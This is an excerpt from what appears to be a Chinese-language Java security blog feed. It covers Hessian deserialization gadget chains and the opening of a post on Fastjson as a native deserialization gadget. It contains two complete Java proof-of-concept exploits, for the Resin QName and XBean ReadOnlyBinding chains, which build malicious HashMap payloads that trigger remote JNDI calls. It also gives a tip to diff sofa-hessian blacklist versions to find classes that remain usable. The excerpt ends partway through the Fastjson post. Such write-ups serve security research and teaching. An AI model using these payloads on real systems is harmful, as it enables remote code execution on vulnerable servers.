title="介绍"></a>介绍</h2><p><code>Resin</code> 中的 <code>com.caucho.naming.QName#toSting()</code> 方法可以触发远程调用。</p><p><img src="/imgs/Pasted%20image%2020240313011915.png"></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line">        setFieldValue(cpe, <span class="string">&quot;cause&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(cpe, <span class="string">&quot;stackTrace&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Foo&quot;</span>, <span class="string">&quot;test1&quot;</span>, <span class="string">&quot;test2&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setFieldValue(cpe, <span class="string">&quot;suppressedExceptions&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> (DirContext) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());</span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx, <span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, qName);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, qName);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(map, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">2</span>);</span><br><span class="line">        Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, hashMap1, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        Array.set(o, <span class="number">1</span>, constructor.newInstance(<span class="number">0</span>, hashMap2, <span class="string">&quot;b&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(map, o);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(map);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="XBean链"><a href="#XBean链" class="headerlink" title="XBean链"></a>XBean链</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p><code>XBean</code> 中的 <code>ContextUtil$ReadOnlyBinding.toString()</code> 方法可以触发远程方法调用。</p><p><img src="/imgs/Pasted%20image%2020240313010132.png"></p><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.ContextUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.WritableContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AbstractAspectJAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> createWithoutConstructor(WritableContext.class);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContextUtil</span>.ReadOnlyBinding(<span class="string">&quot;foo&quot;</span>, ref, ctx);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, binding);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, binding);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(map, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">2</span>);</span><br><span class="line">        Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, hashMap1, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        Array.set(o, <span class="number">1</span>, constructor.newInstance(<span class="number">0</span>, hashMap2, <span class="string">&quot;b&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(map, o);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(map);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><code>Hessian</code> 的全版本都受到上面的影响，因此阿里推出了全新 <code>sofa-hessian</code> 。主要的改进是增加了反序列化的黑名单。</p><p><a href="https://github.com/sofastack/sofa-hessian/blob/master/src/main/resources/security/serialize.blacklist">https://github.com/sofastack/sofa-hessian/blob/master/src/main/resources/security/serialize.blacklist</a></p><p><img src="/imgs/Pasted%20image%2020240313013613.png"></p><p>再次用 <code>Rome</code> 的 <code>poc</code> 会报错：</p><p><img src="/imgs/Pasted%20image%2020240313013652.png"></p><blockquote><p>目前 <code>sofa-hessian</code> 的最新版本是 <code>4.0.4</code> ，如果遇到了这个版本之前的环境，可以通过 <code>diff</code> 不同版本的黑名单来分析可以用什么类。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240313014012.png"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/LittleHann/p/17818994.html">https://www.cnblogs.com/LittleHann/p/17818994.html</a><br><a href="https://h0cksr.xyz/archives/1327">https://h0cksr.xyz/archives/1327</a><br><a href="https://www.cnblogs.com/nice0e3/p/15692979.html#%E8%B0%83%E7%94%A8%E6%A0%88-1">https://www.cnblogs.com/nice0e3/p/15692979.html#%E8%B0%83%E7%94%A8%E6%A0%88-1</a><br><a href="http://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> Hessian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Hessian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson作为原生反序列化的Gadget利用(全版本通杀)</title>
      <link href="/2024/03/11/Fastjson%E4%BD%9C%E4%B8%BA%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Gadget%E5%88%A9%E7%94%A8(%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80)/"/>
      <url>/2024/03/11/Fastjson%E4%BD%9C%E4%B8%BA%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Gadget%E5%88%A9%E7%94%A8(%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>除了常见的 <code>Fastjson</code> 在调用自身的 <code>JSON.parseObject()</code> 来反序列化的时候会触发一些 <code>Gadget</code> 导致漏洞，<code>Fastjson</code> 自身其实也会在 <code>jdk</code> 原生反序列化中作为一个 <code>Gadget</code> 来触发漏洞。这就可以绕过高版本 <code>Fastjson</code> 中对 <code>Autotype</code> 的限制。而且这个利用暂时是 <code>Fastjson</code> 全版本通杀的。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>既然是与原生反序列化相关，那我们应该在 <code>fastjson</code> 包中看哪些类继承了 <code>Serializable</code> 接口，最后找完只有两个类， <code>JSONArray</code> 和 <code>JSONObject</code> 。</p><p>这两个类都继承自 <code>JSON</code> ，而这个类中存在一个 <code>toString()</code> 方法。前面我们在 <code>Fastjson</code> 漏洞总结中提到过，<code>JSON.toString()</code> 可以任意调用任意类的 <code>getter</code> 方法，而有些类的 <code>getter</code> 方法是可以直接触发漏洞的，比如著名的 <code>TemplatesImpl</code> 等等。那现在我们只需要找到 <code>jdk</code> 原生反序列化到 <code>toString()</code> 的链子，就可以连上链子，触发漏洞了。</p><p>这里有两个 <code>jdk</code> 原生的链子可以在 <code>readObject()</code> 中任意调 <code>toString()</code> ：</p><ol><li><code>BadAttributeValueExpException.readObject()</code> -&gt; 任意调 <code>toString()</code></li><li><code>HashMap.readObject()</code> -&gt; <code>XString.equals()</code> （任意调 <code>equals()</code> ）-&gt; 任意调 <code>toString()</code> 。</li></ol><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>两者的 <code>poc</code> 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 